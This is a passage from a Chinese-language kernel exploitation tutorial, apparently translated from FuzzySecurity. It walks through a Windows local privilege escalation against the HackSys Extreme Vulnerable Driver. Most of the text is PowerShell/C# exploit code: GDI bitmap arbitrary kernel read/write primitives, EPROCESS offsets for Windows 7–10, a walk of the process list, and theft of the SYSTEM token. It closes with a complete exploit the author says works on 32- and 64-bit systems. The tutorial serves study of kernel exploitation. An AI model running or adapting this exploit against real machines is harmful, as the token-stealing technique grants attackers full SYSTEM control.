$CallResult = [EVD]::FreeLibrary($KernelHanle)
echo "[+] _EPORCESS list entry: 0x$("{0:X}" -f $SystemEprocess)"
```

![](/images/exploit/fuzzySecurity/20180315_10.jpg)

该地址理应持有一个指向system EPROCESS结构的指针，让我们手动验证它。

![](/images/exploit/fuzzySecurity/20180315_11.jpg)

如果我们把这一逻辑增添到exp中，我们就可以利用Bitmap-Read函数来拷贝system token。还有另外一个需要关心的事，EPROCESS结构体是未文档化的，它变化的相当频繁因此我们需要写一个switch语句来控制不同系统（32/64位）上的不同偏移。我推荐你看一看[@rwfpl](https://twitter.com/rwfpl)最精彩的 [Terminus](http://terminus.rewolf.pl/terminus/)项目，它不止一次的帮助过我。switch语句应该像下面这样，注意到它包含了到ActiveProcessLinks的偏移，我们即将用到。

```powershell
# _EPROCESS UniqueProcessId/Token/ActiveProcessLinks offsets based on OS
# WARNING offsets are invalid for Pre-RTM images!
$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
switch ($OSMajorMinor)
{
    '10.0' # Win10 / 2k16
    {
        if(!$x32Architecture){
            $UniqueProcessIdOffset = 0x2e8
            $TokenOffset = 0x358          
            $ActiveProcessLinks = 0x2f0
        } else {
            $UniqueProcessIdOffset = 0xb4
            $TokenOffset = 0xf4          
            $ActiveProcessLinks = 0xb8
        }
    }
 
    '6.3' # Win8.1 / 2k12R2
    {
        if(!$x32Architecture){
            $UniqueProcessIdOffset = 0x2e0
            $TokenOffset = 0x348          
            $ActiveProcessLinks = 0x2e8
        } else {
            $UniqueProcessIdOffset = 0xb4
            $TokenOffset = 0xec          
            $ActiveProcessLinks = 0xb8
        }
    }
 
    '6.2' # Win8 / 2k12
    {
        if(!$x32Architecture){
            $UniqueProcessIdOffset = 0x2e0
            $TokenOffset = 0x348          
            $ActiveProcessLinks = 0x2e8
        } else {
            $UniqueProcessIdOffset = 0xb4
            $TokenOffset = 0xec          
            $ActiveProcessLinks = 0xb8
        }
    }
 
    '6.1' # Win7 / 2k8R2
    {
        if(!$x32Architecture){
            $UniqueProcessIdOffset = 0x180
            $TokenOffset = 0x208          
            $ActiveProcessLinks = 0x188
        } else {
            $UniqueProcessIdOffset = 0xb4
            $TokenOffset = 0xf8          
            $ActiveProcessLinks = 0xb8
        }
    }
}
```

有了正确的偏移，就可以添加到exp上了。

```powershell
# Get EPROCESS entry for System process
echo "`n[>] Leaking SYSTEM _EPROCESS.."
$KernelBase = $SystemModuleArray[0].ImageBase
$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
$KernelHanle = [EVD]::LoadLibrary("$KernelType")
$PsInitialSystemProcess = [EVD]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
$CallResult = [EVD]::FreeLibrary($KernelHanle)
echo "[+] _EPORCESS list entry: 0x$("{0:X}" -f $SysEprocessPtr)"
$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
echo "[+] SYSTEM _EPORCESS address: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
echo "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
echo "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
```

![](/images/exploit/fuzzySecurity/20180315_12.jpg)

注意到token减了1，这是因为token成员是一个`_EX_FAST_REF`结构，它的最后一位用于引用计数，尽管我们无需担忧这一行为。一个完整的提权过程要先找到PowerShell的EPROCESS结构体，然后用泄露出来的SYSTEM的token来覆盖它。这就是ActiveProcessLinks成员的作用了。EPROCESS结构组成了一个链表，它通过ActiveProcessLinks成员来链入，该成员内部包含了一个`_LIST_ENTRY([IntPtr]Flink, [IntPtr]Blink)`成员，存储了前后两个EPROCESS结构体的地址。我们所需要做的就是遍历该链表，直到我们找到PowerShell进程对应的EPROCESS结构，此后进行token覆盖。下面的代码展示了这一技巧。

```powershell
# Get EPROCESS entry for current process
echo "`n[>] Leaking current _EPROCESS.."
echo "[+] Traversing ActiveProcessLinks list"
$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
while($true) {
    $NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
    if ($NextPID -eq $PID) {
        echo "[+] PowerShell _EPORCESS address: 0x$("{0:X}" -f $NextProcess)"
        echo "[+] PID: $NextPID"
        echo "[+] PowerShell Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
        $PoShTokenAddr = $NextProcess+$TokenOffset
        break
    }
    $NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
}
 
# Duplicate token!
echo "`n[!] Duplicating SYSTEM token!`n"
Bitmap-Write -Address $PoShTokenAddr -Value $SysToken
```

## 游戏结束

下面的exploit可以在32位和64位的Windows 7-10上运行。如果遇到了问题，请留下评论。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
 
[StructLayout(LayoutKind.Sequential, Pack = 1)]
public struct SYSTEM_MODULE_INFORMATION
{
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
    public UIntPtr[] Reserved;
    public IntPtr ImageBase;
    public UInt32 ImageSize;
    public UInt32 Flags;
    public UInt16 LoadOrderIndex;
    public UInt16 InitOrderIndex;
    public UInt16 LoadCount;
    public UInt16 ModuleNameOffset;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
    internal Char[] _ImageName;
    public String ImageName {
        get {
            return new String(_ImageName).Split(new Char[] {'\0'}, 2)[0];
        }
    }
}
 
[StructLayout(LayoutKind.Sequential)]
public struct _PROCESS_BASIC_INFORMATION
{
    public IntPtr ExitStatus;
    public IntPtr PebBaseAddress;
    public IntPtr AffinityMask;
    public IntPtr BasePriority;
    public UIntPtr UniqueProcessId;
    public IntPtr InheritedFromUniqueProcessId;
}
 
/// Partial _PEB
[StructLayout(LayoutKind.Explicit, Size = 256)]
public struct _PEB
{
    [FieldOffset(148)]
    public IntPtr GdiSharedHandleTable32;
    [FieldOffset(248)]
    public IntPtr GdiSharedHandleTable64;
}
 
[StructLayout(LayoutKind.Sequential)]
public struct _GDI_CELL
{
    public IntPtr pKernelAddress;
    public UInt16 wProcessId;
    public UInt16 wCount;
    public UInt16 wUpper;
    public UInt16 wType;
    public IntPtr pUserAddress;
}
 
public static class EVD
{
 
    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(
        IntPtr processHandle, 
        int processInformationClass,
        ref _PROCESS_BASIC_INFORMATION processInformation,
        int processInformationLength,
        ref int returnLength);
 
    [DllImport("ntdll.dll")]
    public static extern int NtQuerySystemInformation(
        int SystemInformationClass,
        IntPtr SystemInformation,
        int SystemInformationLength,
        ref int ReturnLength);
 
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        byte[] OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect);
 
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualFree(
        IntPtr lpAddress,
        uint dwSize,
        uint dwFreeType);
 
    [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibrary(
        string lpFileName);
       
    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);
 
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool FreeLibrary(
        IntPtr hModule);
 
    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateBitmap(
        int nWidth,
        int nHeight,
        uint cPlanes,
        uint cBitsPerPel,
        IntPtr lpvBits);
 
    [DllImport("gdi32.dll")]
    public static extern int SetBitmapBits(
        IntPtr hbmp,
        uint cBytes,
        byte[] lpBits);
 
    [DllImport("gdi32.dll")]
    public static extern int GetBitmapBits(
        IntPtr hbmp,
        int cbBuffer,
        IntPtr lpvBits);
}
"@
 
#==============================================[PEB]
 
# Flag architecture $x32Architecture/!$x32Architecture
if ([System.IntPtr]::Size -eq 4) {
    echo "`n[>] Target is 32-bit!"
    $x32Architecture = 1
} else {
    echo "`n[>] Target is 64-bit!"
}
# Current Proc handle
$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
# Process Basic Information
$PROCESS_BASIC_INFORMATION = New-Object _PROCESS_BASIC_INFORMATION
$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
$returnLength = New-Object Int
$CallResult = [EVD]::NtQueryInformationProcess($ProcHandle, 0, [ref]$PROCESS_BASIC_INFORMATION, $PROCESS_BASIC_INFORMATION_Size, [ref]$returnLength)
# PID & PEB address
echo "`n[?] PID $($PROCESS_BASIC_INFORMATION.UniqueProcessId)"
if ($x32Architecture) {
    echo "[+] PebBaseAddress: 0x$("{0:X8}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt32())"
} else {
    echo "[+] PebBaseAddress: 0x$("{0:X16}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64())"
}
# Lazy PEB parsing
$_PEB = New-Object _PEB
$_PEB = $_PEB.GetType()
$BufferOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()
$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
$PEBFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB)
# GdiSharedHandleTable
if ($x32Architecture) {
    echo "[+] GdiSharedHandleTable: 0x$("{0:X8}" -f $PEBFlags.GdiSharedHandleTable32.ToInt32())"
} else {
    echo "[+] GdiSharedHandleTable: 0x$("{0:X16}" -f $PEBFlags.GdiSharedHandleTable64.ToInt64())"
}
# _GDI_CELL size
$_GDI_CELL = New-Object _GDI_CELL
$_GDI_CELL_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($_GDI_CELL)
 
#==============================================[/PEB]
 
#==============================================[Bitmap]
 
echo "`n[>] Creating Bitmaps.."
 
# Manager Bitmap
[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
$ManagerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
echo "[+] Manager BitMap handle: 0x$("{0:X}" -f [int]$ManagerBitmap)"
if ($x32Architecture) {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
    $ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
    echo "[+] Manager pvScan0 pointer: 0x$("{0:X8}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30))"
} else {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
    $ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50
    echo "[+] Manager pvScan0 pointer: 0x$("{0:X16}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50))"
}
 
# Worker Bitmap
[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
$WorkerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
echo "[+] Worker BitMap handle: 0x$("{0:X}" -f [int]$WorkerBitmap)"
if ($x32Architecture) {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
    $WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
    echo "[+] Worker pvScan0 pointer: 0x$("{0:X8}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30))"
} else {
    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
    echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
    $WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50
    echo "[+] Worker pvScan0 pointer: 0x$("{0:X16}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50))"
}
 
#==============================================[/Bitmap]
 
#==============================================[GDI ring0 primitive]
 
$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
   
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver information.."
    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
    echo "[+] Handle: $hDevice"
}
 
# [IntPtr]$WriteWhatPtr->$WriteWhat + $WriteWhere
#---
[IntPtr]$WriteWhatPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.BitConverter]::GetBytes($WorkerpvScan0).Length)
[System.Runtime.InteropServices.Marshal]::Copy([System.BitConverter]::GetBytes($WorkerpvScan0), 0, $WriteWhatPtr, [System.BitConverter]::GetBytes($WorkerpvScan0).Length)
if ($x32Architecture) {
    [byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt32()) + [System.BitConverter]::GetBytes($ManagerpvScan0)
} else {
    [byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt64()) + [System.BitConverter]::GetBytes($ManagerpvScan0)
}
echo "`n[>] Sending buffer.."
echo "[+] Buffer length: $($Buffer.Length)"
echo "[+] IOCTL: 0x22200B"
[EVD]::DeviceIoControl($hDevice, 0x22200B, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
 
#==============================================[/GDI ring0 primitive]
 
#==============================================[Leak loaded module base addresses]
 
[int]$BuffPtr_Size = 0
while ($true) {
    [IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
    $SystemInformationLength = New-Object Int
 
    # SystemModuleInformation Class = 11
    $CallResult = [EVD]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
     
    # STATUS_INFO_LENGTH_MISMATCH
    if ($CallResult -eq 0xC0000004) {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
        [int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
    }
    # STATUS_SUCCESS
    elseif ($CallResult -eq 0x00000000) {
        break
    }
    # Probably: 0xC0000005 -> STATUS_ACCESS_VIOLATION
    else {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
        echo "[!] Error, NTSTATUS Value: $('{0:X}' -f ($CallResult))`n"
        return
    }
}
 
$SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION
$SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType()
if ([System.IntPtr]::Size -eq 4) {
    $SYSTEM_MODULE_INFORMATION_Size = 284
} else {
    $SYSTEM_MODULE_INFORMATION_Size = 296
}
 
$BuffOffset = $BuffPtr.ToInt64()
$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
$BuffOffset = $BuffOffset + [System.IntPtr]::Size
 
$SystemModuleArray = @()
for ($i=0; $i -lt $HandleCount; $i++){
    $SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
    $Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION)
     
    $HashTable = @{
        ImageName = $Cast.ImageName
        ImageBase = if ([System.IntPtr]::Size -eq 4) {$($Cast.ImageBase).ToInt32()} else {$($Cast.ImageBase).ToInt64()}
        ImageSize = "0x$('{0:X}' -f $Cast.ImageSize)"
    }
     
    $Object = New-Object PSObject -Property $HashTable
    $SystemModuleArray += $Object
 
    $BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size
}
 
# Free SystemModuleInformation array
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
 
#==============================================[/Leak loaded module base addresses]
 
#==============================================[Duplicate SYSTEM token]
 
# _EPROCESS UniqueProcessId/Token/ActiveProcessLinks offsets based on OS
# WARNING offsets are invalid for Pre-RTM images!
$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
switch ($OSMajorMinor)
{
    '10.0' # Win10 / 2k16
    {
        if(!$x32Architecture){
            $UniqueProcessIdOffset = 0x2e8
            $TokenOffset = 0x358          
            $ActiveProcessLinks = 0x2f0
        } else {
            $UniqueProcessIdOffset = 0xb4
            $TokenOffset = 0xf4          
            $ActiveProcessLinks = 0xb8
        }
    }
  
    '6.3' # Win8.1 / 2k12R2
    {
        if(!$x32Architecture){
            $UniqueProcessIdOffset = 0x2e0
            $TokenOffset = 0x348          
            $ActiveProcessLinks = 0x2e8
        } else {
            $UniqueProcessIdOffset = 0xb4
            $TokenOffset = 0xec          
            $ActiveProcessLinks = 0xb8
        }
    }
  
    '6.2' # Win8 / 2k12
    {
        if(!$x32Architecture){
            $UniqueProcessIdOffset = 0x2e0
            $TokenOffset = 0x348          
            $ActiveProcessLinks = 0x2e8
        } else {
            $UniqueProcessIdOffset = 0xb4
            $TokenOffset = 0xec          
            $ActiveProcessLinks = 0xb8
        }
    }
  
    '6.1' # Win7 / 2k8R2
    {
        if(!$x32Architecture){
            $UniqueProcessIdOffset = 0x180
            $TokenOffset = 0x208          
            $ActiveProcessLinks = 0x188
        } else {
            $UniqueProcessIdOffset = 0xb4
            $TokenOffset = 0xf8          
            $ActiveProcessLinks = 0xb8
        }
    }
}
 
# Arbitrary Kernel read
function Bitmap-Read {
    param ($Address)
    $CallResult = [EVD]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
    [IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
    $CallResult = [EVD]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
    if ($x32Architecture){
        [System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
    } else {
        [System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
    }
    $CallResult = [EVD]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
}
 
# Arbitrary Kernel write
function Bitmap-Write {
    param ($Address, $Value)
    $CallResult = [EVD]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
    $CallResult = [EVD]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
}
 
# Get EPROCESS entry for System process
echo "`n[>] Leaking SYSTEM _EPROCESS.."
$KernelBase = $SystemModuleArray[0].ImageBase
$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
$KernelHanle = [EVD]::LoadLibrary("$KernelType")
$PsInitialSystemProcess = [EVD]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
$CallResult = [EVD]::FreeLibrary($KernelHanle)
echo "[+] _EPORCESS list entry: 0x$("{0:X}" -f $SysEprocessPtr)"
$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
echo "[+] SYSTEM _EPORCESS address: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
echo "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
echo "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
 
# Get EPROCESS entry for current process
echo "`n[>] Leaking current _EPROCESS.."
echo "[+] Traversing ActiveProcessLinks list"
$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
while($true) {
    $NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
    if ($NextPID -eq $PID) {
        echo "[+] PowerShell _EPORCESS address: 0x$("{0:X}" -f $NextProcess)"
        echo "[+] PID: $NextPID"
        echo "[+] PowerShell Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
        $PoShTokenAddr = $NextProcess+$TokenOffset
        break
    }
    $NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
}
 
# Duplicate token!
echo "`n[!] Duplicating SYSTEM token!`n"
Bitmap-Write -Address $PoShTokenAddr -Value $SysToken
 
#==============================================[/Duplicate SYSTEM token]
```

![](/images/exploit/fuzzySecurity/20180315_13.jpg)

![](/images/exploit/fuzzySecurity/20180315_14.jpg)